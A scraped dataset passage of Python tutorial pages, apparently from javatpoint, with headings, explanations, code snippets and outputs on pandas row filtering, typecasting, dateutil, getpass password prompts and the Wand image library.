'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 21, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 71, 71, 82, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subjects_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', ""Subjects_2 = ['ASPM', 'ADS', 'TOC']"", '# Then we will select rows based on condition, That is, Using isin[] method', ""result_DataFrame = Data_Frame[(Data_Frame['Percentage_1'] == 71) &"", ""Data_Frame['Subjects_1'].isin(Subjects_2)]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)"", '# First, import pandas', 'import pandas as pnd', 'record_1 = {', ""'Name_1': ['Anuj', 'Ashu', 'Yashi', 'Mark', 'Joshua', 'John', 'Ray', 'Lilly', 'Rose', 'Rachel' ],"", ""'Age_1': [23, 21, 21, 19, 21, 24, 25, 22, 23, 22],"", ""'Subjects_1': ['DBMS', 'ADS', 'ASPM', 'BCM', 'MFCS', 'ADS', 'ASPM', 'TOC', 'Data Mining', 'OOPS'],"", ""'Percentage_1': [88, 71, 71, 82, 55, 78, 70, 66, 71, 89] }"", '# Now, we are creating a dataframe', ""Data_Frame = pnd.DataFrame(record_1, columns = ['Name_1', 'Age_1', 'Subjects_1', 'Percentage_1'])"", 'print(""Given DataFrame: \\n"", Data_Frame)', ""Subjects_2 = ['ASPM', 'ADS', 'TOC']"", '# Then we will select rows based on condition, That is, Using isin[] method', ""result_DataFrame = Data_Frame.loc[(Data_Frame['Percentage_1'] == 71) &"", ""Data_Frame['Subjects_1'].isin(Subjects_2)]"", ""print('\\nFollowing is the Result DataFrame: \\n', result_DataFrame)""]","['Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     24          ADS            62', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '5    John     24          ADS            78', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     24          ADS            62', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '5    John     24          ADS            78', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     24          ADS            62', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1 Subjects_1  Percentage_1', '0    Anuj     23       DBMS            88', '1    Ashu     24        ADS            62', '2   Yashi     21       ASPM            85', '4  Joshua     21       MFCS            55', '5    John     24        ADS            78', '6     Ray     25       ASPM            70', '7   Lilly     22        TOC            66', '9  Rachel     22       OOPS            89', 'Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     24          ADS            62', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1 Subjects_1  Percentage_1', '1   Ashu     24        ADS            62', '2  Yashi     21       ASPM            85', '5   John     24        ADS            78', '6    Ray     25       ASPM            70', '7  Lilly     22        TOC            66', 'Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     24          ADS            62', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1 Subjects_1  Percentage_1', '1   Ashu     24        ADS            62', '2  Yashi     21       ASPM            85', '5   John     24        ADS            78', '6    Ray     25       ASPM            70', '7  Lilly     22        TOC            66', 'Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     24          ADS            62', '2   Yashi     21         ASPM            85', '3    Mark     19          BCM            71', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '3    Mark     19          BCM            71', '4  Joshua     21         MFCS            55', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     21          ADS            71', '2   Yashi     21         ASPM            71', '3    Mark     19          BCM            82', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1 Subjects_1  Percentage_1', '1   Ashu     21        ADS            71', '2  Yashi     21       ASPM            71', 'Given DataFrame:', 'Name_1  Age_1   Subjects_1  Percentage_1', '0    Anuj     23         DBMS            88', '1    Ashu     21          ADS            71', '2   Yashi     21         ASPM            71', '3    Mark     19          BCM            82', '4  Joshua     21         MFCS            55', '5    John     24          ADS            78', '6     Ray     25         ASPM            70', '7   Lilly     22          TOC            66', '8    Rose     23  Data Mining            71', '9  Rachel     22         OOPS            89', 'Following is the Result DataFrame:', 'Name_1  Age_1 Subjects_1  Percentage_1', '1   Ashu     21        ADS            71', '2  Yashi     21       ASPM            71']",[],[]
364,['Typecasting in Python'],"['In this tutorial, we will learn how typecasting happens in Python.']","['https://www.javatpoint.com/dateutil-module-in-python', 'https://www.javatpoint.com/how-to-select-rows-in-pandas-dataframe-based-on-conditions', 'https://www.javatpoint.com/dateutil-module-in-python', 'https://www.javatpoint.com/how-to-select-rows-in-pandas-dataframe-based-on-conditions', 'https://www.javatpoint.com/dateutil-module-in-python']",[],[],"['Implicit Type Conversion', 'Explicit Type Conversion', 'Conclusion']",[],[],"['We come across different kinds of arithmetic operations in which multiple data types are involved and then results are obtained accordingly.', 'Here we will discuss both,', ""Let's understand them with the help of programs-"", 'During the implicit type conversion, the user is not supposed to mention any specific data type during the conversion.', 'The following program illustrates how it can be done in Python.', 'Explanation-', ""Let's have a glance at the explanation of this program."", ""Now, it's time to move on to the next thing which is explicit type conversion."", 'In this type conversion, the user is supposed to pass the value in a function to obtain the required data type.', 'The int(), float() and str() are mostly used for the explicit type conversion.', 'Consider the program given below,', 'Explanation-', ""Let's understand what we have done in this program."", 'Finally, let us have a look at the last program of this article that covers possible types of explicit type conversions.', 'Explanation-', 'The approach is similar to the above program and in this program, we have included conversion using all the three int(), str(), and float().', 'In this tutorial, we learned what is typecasting in python, what are its types, and how it can be performed in Python.']",[],[],"['#program to demonstrate implicit type conversion', '#initializing the value of a', 'print(a)', 'print(""The type of a is "", type(a))', '#initializing the value of b', 'b = 4.5', 'print(b)', 'print(""The type of b is "", type(b))', '#initializing the value of c', 'c = 4.0', 'print(c)', 'print(""The type of c is "", type(c))', '#initializing the value of d', 'd = 5.0', 'print(d)', 'print(""The type of d is "", type(d))', '#performing arithmetic operations', 'res = a * b', 'print(""The product of a and b is "", res)', 'add = c + d', 'print(""The addition of c and d is "", add)', '#program to demonstrate explicit type conversion', '#initializing the value of a', 'print(""The type of \'a\' before typecasting is "",type(a))', 'print(int(a))', 'print(""The type of \'a\' after typecasting is"",type(a))', '#initializing the value of b', 'print(""The type of \'b\' before typecasting is "",type(b))', 'print(int(b))', 'print(""The type of \'b\' after typecasting  is"",type(b))', '#initializing the value of c', 'print(""The type of \'c\' before typecasting is "",type(c))', 'print(float(c))', 'print(""The type of \'c\' after typecasting is"",type(c))', '#program to demonstrate explicit type conversion', '#initializing the value of a', 'print(""The type of \'a\' before typecasting is "",type(a))', 'print(str(a))', 'print(""The type of \'a\' after typecasting is"",type(a))', '#initializing the value of b', 'print(""The type of \'b\' before typecasting is "",type(b))', 'print(int(b))', 'print(""The type of \'b\' after typecasting  is"",type(b))', '#initializing the value of c', ""c='7.9'"", 'print(""The type of \'c\' before typecasting is "",type(c))', 'print(float(c))', 'print(""The type of \'c\' after typecasting is"",type(c))']","['10', ""The type of a is <class 'int'>"", '4.5', ""The type of b is <class 'float'>"", '4.0', ""The type of c is <class 'float'>"", '5.0', ""The type of d is <class 'float'>"", 'The product of a and b is  45.0', 'The addition of c and d is  9.0', ""The type of 'a' before typecasting is  <class 'float'>"", '10', ""The type of 'a' after typecasting is <class 'float'>"", ""The type of 'b' before typecasting is  <class 'float'>"", '8', ""The type of 'b' after typecasting  is <class 'float'>"", ""The type of 'c' before typecasting is  <class 'int'>"", '7.0', ""The type of 'c' after typecasting is <class 'int'>"", ""The type of 'a' before typecasting is  <class 'int'>"", '10', ""The type of 'a' after typecasting is <class 'int'>"", ""The type of 'b' before typecasting is  <class 'str'>"", '8', ""The type of 'b' after typecasting  is <class 'str'>"", ""The type of 'c' before typecasting is  <class 'str'>"", '7.9', ""The type of 'c' after typecasting is <class 'str'>""]",[],"['|||Implicit type conversion|||Explicit type conversion||||||To check how the values get converted on performing the operations we have initialized the values of a,b, c and d.|||After this, we have checked the data type of each one of them.|||Finally, we have performed addition on the variables a and b and multiplication on the variables c and d.|||On executing the above program, we can observe that in the case of the product the final result is a float value(a was an integer and b was float).||||||We have initialized the values of a, b, and c.|||We have used int() and float() in this program to see how does explicit type conversion takes place.|||On executing this program, we can verify how the data type changes.|||']"
365,['Dateutil module in Python'],"['Whenever we start working with scripts that need real-time data, we have to use the dateutil module in order to retrieve or schedule data at a specific time or input data with the timestamp of retrieval.']","['https://www.javatpoint.com/getpass-module-in-python', 'https://www.javatpoint.com/typecasting-in-python', 'https://www.javatpoint.com/getpass-module-in-python', 'https://www.javatpoint.com/typecasting-in-python', 'https://www.javatpoint.com/getpass-module-in-python']",[],[],"['An Introduction to the Python dateutil module', 'Understanding the Python dateutil module', 'How to install the dateutil module in Python?', 'Working with the Python dateutil module']","['Chief Characteristics of the Python dateutil module', 'Verifying the Installation', 'The dateutil module and its subclasses', 'Importing the necessary modules', 'The datetime functionality', 'Datetime and relativedelta', 'Datetime and easter', 'Datetime and parser', 'Datetime and rrule']",[],"['Providentially, the developers created the dateutil module to deliver the functionality to make life easier.', ""So, let's get begun."", 'The chief characteristics of the dateutil module in Python are as follows:', 'We will be using the pip installer in order to install the required module by typing the following command in a terminal:', 'In order to check whether the module has been installed in the system properly or not, we can try importing the module and execute the program.', 'Once the installation is complete, create a new Python file and type the following syntax in it.', 'Now, save the file and run the file using the following command in the command prompt.', 'Now, let us proceed to work with the dateutil module in the Python programming language.', 'The dateutil module is split into several subclasses as shown below:', 'This module does not contain so many subclasses; however, we will only be exploring the functions of some of them in this tutorial.', 'Since we have installed the module properly, now is the time to put the methods into action and retrieve the outputs.', 'In order to start working with the Python dateutil module and some, we just have to import them first.', 'The following syntax shows the importing of the required modules.', 'Explanation:', 'Before we get to the coding part of the dateutil module, we must understand that the module relies on the datetime module.', ""Thus, it becomes necessary for the importing of the datetime module. Now, let's begin working with some of the methods in the dateutil module."", 'Let us consider the following example to understand the concept properly.', 'Explanation:', 'Now, let us work with getting information with the help of the relative dates.', 'Explanation:', 'A more applicable utilization of this module would be to find out the information with the help of some small operations.', 'Let us consider the following example to understand the same.', 'Explanation:', 'The subclass is pretty small, and there is only one parameter with three options that define the whole module.', 'The Julian Calendar, EASTER_JULIAN = 1', 'The Gregorian Calendar, EASTER_ORTHODOX = 2', 'The Western Calendar, EASTER_WESTERN = 3', 'Let us consider the following example to understand the working of the calendars as mentioned above.', 'Explanation:', 'In the above snippet of code, we have imported the required modules and used the easter subclass to print the date in different Calendars formats.', 'Let us consider the following example to understand the same.', 'Explanation:', 'In the above snippet of code, we have imported the required modules again and used the parser subclass to parse the date and time strings.', 'There are many choices we can offer, including the time zones, locally or explicitly.', 'We can use the variables passed into the function as default parameters to extract details in order to deliver the time zones, year and time.', 'The rrule subclass is used to gather information regarding the recurrence of a datetime object and the datetime objects, respectively.', 'Let us consider the following example to understand the same.', 'Explanation:']","['It could be a daunting activity to work with a lot of scripts and try to manipulate formats of date and time with the help of the default datetime module, considering the number of changes to the data retrieved we have to make.', ""Before we start working with the dateutil module, the primary objective is to install the module on the system. So, let's get to the installation procedure."", 'If the program runs without raising any import error, the module is installed properly. Else it is recommended to reinstall the module and refer to its official documentation.', 'In the above snippet of code, we have imported the datetime module to import methods. We have then imported some methods from the dateutil subclasses.', 'The Python dateutil module works along with the datetime objects, and this implies that we will have to create the datetime objects before we start working with them.', 'The relativedelta subclass extends off the datetime module, offering the programmers features to work with dates and times relative to the retrieved details.', 'This statement signifies that we can insert days, months, or even years to the presently used datetime object. It also enables the programmers to work with intervals in time, with the datetime objects.', 'In the above snippet of code, we have imported the required modules and created the objects of the datetime module to retrieve details for present date and time. We have then printed those details for the users.', ""In the above snippet of code, we have imported the required modules. We have then used the value of present date and time in order to find the information regarding any last day in the month or someone's age according to their birthday."", 'The easter subclass is utilized to estimate date and time with generic easter calendars, allowing programmers to calculate the datetime objects with respect to a variety of calendars.', 'The parser subclass is used as a superior date and time string parser. This subclass is able to parse more than one known format depicting a date or a time.', 'In the above snippet of code, we have again imported the required module. We have then used the rrule subclass to collect information regarding the recurrence of a datetime object.', 'A great ability of the dateutil module is that this subclass could allow programmers to work with multiple scheduling tasks and calendar storage innovations.']","['In the following tutorial, we will understand the Python dateutil module in depth. Python modules are files that consist of certain definitions and statements. We can use these modules to break down a large program into small segments, and they are imported into programs to avail their functions. The dateutil module is among these predefined modules in the Python programming language utilized when we have to perform work associated with a certain date and time.', 'There is a core module available in the Python programming language known as the datetime module. We use this module for the manipulation of dates and times from simpler to complex methods. Even though this module is adequate for a specific number of instances, the Python dateutil module offers particular powerful extensions to the datetime module.', 'In the above snippet of code, we have imported the required modules and used the values of present date and time to find the information in respect to the relative deltas like date and time of next month, a month and a week, a month and a week at 4 PM and the date of upcoming Friday.']","['$ pip install python-dateutil', '# importing the required module', 'import dateutil', '$ python <file-name>.py', '# importing methods from the datetime module as a base.', 'import datetime', '# importing several methods from the dateutil subclasses.', 'from dateutil.relativedelta import *', 'from dateutil.easter import *', 'from dateutil.parser import *', 'from dateutil.rrule import *', '# importing methods from the datetime module as a base.', 'import datetime', '# importing several methods from the dateutil subclasses.', 'from dateutil.relativedelta import *', 'from dateutil.easter import *', 'from dateutil.parser import *', 'from dateutil.rrule import *', '# Creating some datetime objects', 'present_datetime = datetime.datetime.now()', 'print(""The Present datetime:"", present_datetime)', 'present_date = datetime.date.today()', 'print(""The Present date:"", present_date)', '# importing methods from the datetime module as a base.', 'import datetime', '# importing several methods from the dateutil subclasses.', 'from dateutil.relativedelta import *', 'from dateutil.easter import *', 'from dateutil.parser import *', 'from dateutil.rrule import *', '# Creating some datetime objects', 'present_datetime = datetime.datetime.now()', 'present_date = datetime.date.today()', '# Next month', 'print(""Next month:"", present_datetime + relativedelta(months =+ 1))', '# Next month, and a week', 'print(""Next month, and a week:"", present_datetime + relativedelta(months =+ 1, weeks =+ 1))', '# Next month, and a week, at 4 PM', 'print(""Next month, plus one week, at 4 PM:"", present_datetime + relativedelta(months =+ 1, weeks =+ 1, hour = 16))', '# Next Friday', 'print(""Next Friday:"", present_date + relativedelta(weekday = FR))', '# importing methods from the datetime module as a base.', 'import datetime', '# importing several methods from the dateutil subclasses.', 'from dateutil.relativedelta import *', 'from dateutil.easter import *', 'from dateutil.parser import *', 'from dateutil.rrule import *', '# Creating some datetime objects', 'present_datetime = datetime.datetime.now()', 'present_date = datetime.date.today()', '# Finding out the last Monday in the month', 'print(""Last Monday:"",present_date + relativedelta(day = 31, weekday = MO(-1)))', '# We can also work with datetime objects directly', '# Example: Age of David', 'david_birthday = datetime.datetime(1983, 5, 23, 12, 0)', 'print(""David\'s Age:"", relativedelta(present_datetime, david_birthday).years)', '# importing methods from the datetime module as a base.', 'import datetime', '# importing several methods from the dateutil subclasses.', 'from dateutil.relativedelta import *', 'from dateutil.easter import *', 'from dateutil.parser import *', 'from dateutil.rrule import *', '# The Julian Calendar', 'print(""Julian Calendar:"", easter(1335, 1))', '# The Gregorian Calendar', 'print(""Gregorian Calendar:"", easter(1335, 2))', '# The Western Calendar', 'print(""Western Calendar:"", easter(1335, 3))', '# importing methods from the datetime module as a base.', 'import datetime', '# importing several methods from the dateutil subclasses.', 'from dateutil.relativedelta import *', 'from dateutil.easter import *', 'from dateutil.parser import *', 'from dateutil.rrule import *', '# The parser subclass', 'print(parse(""Thu Oct 25 11:36:28 BRST 2005""))', '# We can also ignore the timezone which is set to default locally', 'print(parse(""Thu Oct 25 11:36:28 BRST 2005"", ignoretz = True))', '# We can also not provide a timezone, or a year', '# This allows for it to return the current year, with no timezone inclusion.', 'print(parse(""Thu Oct 25 11:36:28""))', '# We can also provide variables which consist of the information, as values.', 'DEFAULT = datetime.datetime(2021, 10, 23)', 'print(parse(""11:36"", default = DEFAULT))', '# importing methods from the datetime module as a base.', 'import datetime', '# importing several methods from the dateutil subclasses.', 'from dateutil.relativedelta import *', 'from dateutil.easter import *', 'from dateutil.parser import *', 'from dateutil.rrule import *', '# The rrule subclass', '# Daily repetition for 15 occurrences', 'print(list(rrule(DAILY, count = 15, dtstart = parse(""20210925T091000""))))', '# Repeating based on the interval', 'print(list(rrule(DAILY, interval = 8, count = 4, dtstart = parse(""20210925T091000""))))', '# Weekly repetition', 'print(list(rrule(WEEKLY, count = 5, dtstart = parse(""20210925T091000""))))', '# Monthly repetition', 'print(list(rrule(MONTHLY, count = 5, dtstart = parse(""20210925T091000""))))', '# Yearly repetition', 'print(list(rrule(YEARLY, count = 5, dtstart = parse(""20210925T091000""))))']","['The Present datetime: 2021-10-20 12:38:19.319256', 'The Present date: 2021-10-20', 'Next month: 2021-11-20 12:54:38.805725', 'Next month, and a week: 2021-11-27 12:54:38.805725', 'Next month, plus one week, at 4 PM: 2021-11-27 16:54:38.805725', 'Next Friday: 2021-10-22', 'Last Monday: 2021-10-25', ""David's Age: 38"", 'Julian Calendar: 1335-04-16', 'Gregorian Calendar: 1335-04-26', 'Western Calendar: 1335-04-17', '2005-10-25 11:36:28', '2005-10-25 11:36:28', '2021-10-25 11:36:28', '2021-10-23 11:36:00', '[datetime.datetime(2021, 9, 25, 9, 10), datetime.datetime(2021, 9, 26, 9, 10), datetime.datetime(2021, 9, 27, 9, 10), datetime.datetime(2021, 9, 28, 9, 10), datetime.datetime(2021, 9, 29, 9, 10), datetime.datetime(2021, 9, 30, 9, 10), datetime.datetime(2021, 10, 1, 9, 10), datetime.datetime(2021, 10, 2, 9, 10), datetime.datetime(2021, 10, 3, 9, 10), datetime.datetime(2021, 10, 4, 9, 10), datetime.datetime(2021, 10, 5, 9, 10), datetime.datetime(2021, 10, 6, 9, 10), datetime.datetime(2021, 10, 7, 9, 10), datetime.datetime(2021, 10, 8, 9, 10), datetime.datetime(2021, 10, 9, 9, 10)]', '[datetime.datetime(2021, 9, 25, 9, 10), datetime.datetime(2021, 10, 3, 9, 10), datetime.datetime(2021, 10, 11, 9, 10), datetime.datetime(2021, 10, 19, 9, 10)]', '[datetime.datetime(2021, 9, 25, 9, 10), datetime.datetime(2021, 10, 2, 9, 10), datetime.datetime(2021, 10, 9, 9, 10), datetime.datetime(2021, 10, 16, 9, 10), datetime.datetime(2021, 10, 23, 9, 10)]', '[datetime.datetime(2021, 9, 25, 9, 10), datetime.datetime(2021, 10, 25, 9, 10), datetime.datetime(2021, 11, 25, 9, 10), datetime.datetime(2021, 12, 25, 9, 10), datetime.datetime(2022, 1, 25, 9, 10)]', '[datetime.datetime(2021, 9, 25, 9, 10), datetime.datetime(2022, 9, 25, 9, 10), datetime.datetime(2023, 9, 25, 9, 10), datetime.datetime(2024, 9, 25, 9, 10), datetime.datetime(2025, 9, 25, 9, 10)]']",[],"['|||The dateutil module supports the parsing of dates in any string format.|||This module provides internal up-to-date world time zone details.|||This module helps in computing the relative deltas|||This module also helps in computing the dates based on pretty flexible rules of recurrence.||||||easter,|||parser,|||relativedelta,|||rrule,||||||tz,|||and many more.||||||']"
366,['Getpass module in Python'],"['There are various Python programs where we have to use secret keys, pass-phrases, or passwords for a secret transaction or identify a user who is authorized to perform some activity. Various actions have to be taken care of during the acceptance of the keys, that the phrase should not be echoed back to the screen, disabling the echoing of statements and a lot more. The getpass module in the Python programming language offers all of these features.']","['https://www.javatpoint.com/automate-linkedin-connections-using-python', 'https://www.javatpoint.com/dateutil-module-in-python', 'https://www.javatpoint.com/automate-linkedin-connections-using-python', 'https://www.javatpoint.com/dateutil-module-in-python', 'https://www.javatpoint.com/automate-linkedin-connections-using-python']",[],[],"['Understanding the Python getpass module', 'Understanding the getpass() function', 'Understanding the getuser() function']","['getpass() function without prompt', 'getpass() function with prompt', 'getpass() function with other streams']",[],"['In the following tutorial, we will be discussing the Python getpass module in detail with the help of different examples and understanding its uses.', 'These functions are as follows:', 'Let us understand the same using the following example:', 'Explanation:', 'Now let us understand the different uses of the getpass() function with the help of the examples.', 'In the following example, we will understand how to get a password from users and return the same password without a prompt.', 'Explanation:', 'If the user requires some message such as a security question before logging in, we will utilize prompt attributes in the getpass() function.', 'Let us consider the following example to understand the same.', 'Explanation:', 'This function enables the programmers to stream the password a user inputs. Let us understand the same with the help of an example given below:', 'Explanation:', 'Let us consider an example based on the getuser() function to retrieve the username of the computer.', 'Explanation:', 'In the above snippet of code, we have imported the getpass module and used the getuser() function to retrieve the username stored in the system.', 'Now, let us consider another example to get a username and password using the getuser() and getpass() functions.', 'Explanation:']","['Similar to the NumPy and Matplotlib modules, getpass is also a module of the Python programming language. The getpass module asks the user for a password without echoing, which implies without displaying what the user is typing.', 'Whenever we utilize an application based on a terminal with different security credentials that utilize passwords before the execution of the application, then it will be accomplished using the Python getpass module.', 'The getpass module of the standard library of Python has broadly defined two functions. These functions are supportable whenever a terminal-based application has to be executed only after the validation of the user credentials.', 'In various programs, we have secure data or programs then this scenario, we utilize some secret or key or passwords in order to identify the users. Using the getpass() function, we can accept the password in the Python program.', 'In the above snippet of code, we have imported the getpass module and defined a parameter that uses the getpass(). Here, we have not specified any parameter. We have then printed a statement for the users.', 'In the above snippet of code, we have imported the getpass module and defined the variables that use the getuser() and getpass() functions to get the username and password. We have then printed those values for the users.']","['In the above snippet of code, we have imported the getpass module and created a variable that uses the getpass() function of the getpass module to store the value of the key. We have then used the if-else conditional statements to check if the input value matches the value in the variable and, if so, unlock it for the user.', 'In the above snippet of code, we have imported the getpass module. We have then defined a variable that uses the getpass() function along with the prompt parameter to include some message. We have then used the if-else conditional statement to check if the entered value of the password matches the value stored in the program and print the respective statements for the same.', 'In the above snippet of code, we have imported the getpass module along with the sys module. We have then defined a variable that uses the getpass() function that accepts the sys.stderr stream as a parameter of the function. We have then printed a statement to ask the password from the user.', 'The getuser() function returns the system login name of the user. This function checks the environment variable of the computer. It fetches the name of the user and returns a string, and if it is unable to find the environment variable, then an exception is raised.']","['# importing the getpass module', 'import getpass', '# using the getpass() function', ""my_pass = getpass.getpass(prompt = 'Input the Password:')"", '# using the if-else conditional statments', ""if my_pass == 'Admin':"", ""print('The key is Unlocked!')"", ""print('You\\'ve entered an invalid password!')"", '# importing the getpass module', 'import getpass', '# using the getpass() function without prompt', 'my_pass = getpass.getpass()', '# printing the statement', 'print(""Entered password:"", my_pass)', '# importing the getpass module', 'import getpass', '# using the getpass() function with prompt', 'my_pass = getpass.getpass(prompt = ""What is your birthplace?:"")', '# using the if-else conditional statement', ""if my_pass == 'Ohio':"", 'print(""Unlock! Welcome back Dani."")', 'print(""Your password is invalid!"")', '# importing the getpass and sys modules', 'import getpass', 'import sys', '# using the getpass() function with stream', 'my_pass = getpass.getpass(stream = sys.stderr)', '# printing the statement', 'print(""Entered Password:"", my_pass)', '# importing the getpass and sys modules', 'import getpass', '# using the getuser() function', 'my_user = getpass.getuser()', '# printing the value', 'print(""Username:"", my_user)', '# importing the getpass module', 'import getpass', '# using the getuser() and getpass() functions', 'my_user = getpass.getuser()', 'my_pass = getpass.getpass(""Enter Password:"")', '# printing the values', 'print(""Username:"", my_user)', 'print(""Password:"", my_pass)']","['Input the Password:', '# The inserted value is Admin', 'The key is Unlocked!', 'Password:', '# The inserted value is Admin', 'Entered password: Admin', 'What is your birthplace?:', '# The inserted value is Ohio', 'Unlock! Welcome back Dani.', 'Password:', '# The inserted value is Admin', 'Entered Password: Admin', 'Username: Mango', 'Enter Password:', '# The inserted value is Admin', 'Username: Mango', 'Password: Admin']",[],['|||getpass() function|||getuser() function|||']
367,['Python Wand library'],['ImageMagick is a utility designed and developed for the image conversion from one format to another. The tool has been supported by a large community because of a versatile variety of image formats and its precise as well as straightforward execution. We can get images from PDF format files.'],"['https://www.javatpoint.com/generate-a-qr-code-using-python', 'https://www.javatpoint.com/variable-length-arguments-in-python', 'https://www.javatpoint.com/https://www.imagemagick.org/download/binaries/', 'https://www.javatpoint.com/generate-a-qr-code-using-python', 'https://www.javatpoint.com/variable-length-arguments-in-python', 'https://www.javatpoint.com/generate-a-qr-code-using-python']","['https://static.javatpoint.com/python/images/python-wand-library.png', 'https://static.javatpoint.com/python/images/python-wand-library.png', 'https://static.javatpoint.com/python/images/python-wand-library2.png', 'https://static.javatpoint.com/python/images/python-wand-library.png', 'https://static.javatpoint.com/python/images/python-wand-library3.jpg', 'https://static.javatpoint.com/python/images/python-wand-library4.jpg']",[],"['Understanding the Wand library in Python', 'How to install the wand library?', 'Reading an Image using Python Wand', 'Blurring an Image using Python Wand', 'Transforming the image using Python Wand', 'Drawing different figures using Python Wand']","['Uses of the Python Wand library:', 'For Ubuntu/Debian:', 'For Mac (Using Brew Installer):', 'Installation of MacPort:', 'For Windows:', 'Verifying the Installation']","['Note: If Python is not installed using MacPort, we have to export MAGICK_HOME as shown below:']","[""So, let's get begun."", 'Now, let us install the Python wand library.', 'We can install the wand module with the help of the pip installer using the following command:', 'The module will be installed in the system as the version of Python and pip.', 'We can download it from the following links:\nhttps://www.imagemagick.org/download/binaries/', 'In order to check whether the module has been installed in the system properly or not, we can try importing the module and execute the program.', 'Once the installation is complete, create a new Python file and type the following syntax in it.', 'Now, save the file and run the file using the following command in the command prompt.', 'Now, let us understand start working with the wand library.', 'Let us consider the following example for the same.', 'Input Image:', 'Explanation:', 'The wand library allows the programmers in order to blur an image using the blur() function and save it as the save() function.', 'Let us consider the following example to understand the same.', 'Input Image:', 'Explanation:', 'As a result, the provided image gets blurred with radius 0 and sigma 3 and saved as the specified filename.', 'We can also transform the image using the several functions of the wand library. Let us consider the following example to understand the same.', 'Input Image:', 'Explanation:', 'As a result, the input image has been transformed successfully.', 'The Python wand library also provides us with different functions that allow us to draw different figures.', 'Let us consider the following example to understand the same.', 'Explanation:']","['In the following tutorial, we will be going to discuss a binding developed for Python by Imagemagick called wand. We will understand the features and uses of the Wand library in the Python programming language with different examples.', 'As we have discussed that the wand library is an Imagick API, thus, we have to include the Imagick dependencies also. The installation procedure for Imagick dependencies is quite distinct for different Operating Systems.', 'We can create ImageMagick by ourselves; however, it needs a build tool chain such as Visual Studio in order to compile it. One simple method is to download a prebuilt binary of ImageMagick for the architecture (win32 or win64)', 'If the program runs without raising any import error, the module is installed properly. Else it is recommended to reinstall the module and refer to its official documentation.', 'The image library of the Python wand allows the programmers to import the image file using its Image module. We can then use different attributes in order to read the image, such as height, width, and many more.']","['The wand is an ImageMagick library developed for the Python programming language. This library supports the functionalities of ImageMagick or Imagick API in Python version 2.6, 2.7, 3.3+, and PyPy. The wand is used to open and manipulate images. This library not only supports the processing of the images but also offers valuable functionalities for Machine Learning codes with the help of the NumPy library. The wand provides a big number of functions to manipulate images. Some of the uses of the Python wand library are shown below:', 'In the above snippet of code, we have imported the Image module from the wand.image library. We have then used the Image() function to import the image from the directory. We have then used different attributes to read the dimensions of the input image. As a result, the program returned the dimensions (height and width) of the images to the users.', 'In the above snippet of code, we have imported the Image module from the wand.image library. We have then imported the required image from the directory and used the blur() function, specifying the radius parameter to 0 and the sigma parameter to 3. At last, we have saved the file using the save() function specifying the new filename to the image file.', 'In the above snippet of code, we have imported the Image module from the wand.image library. We have then again imported the image file from the directory and used the 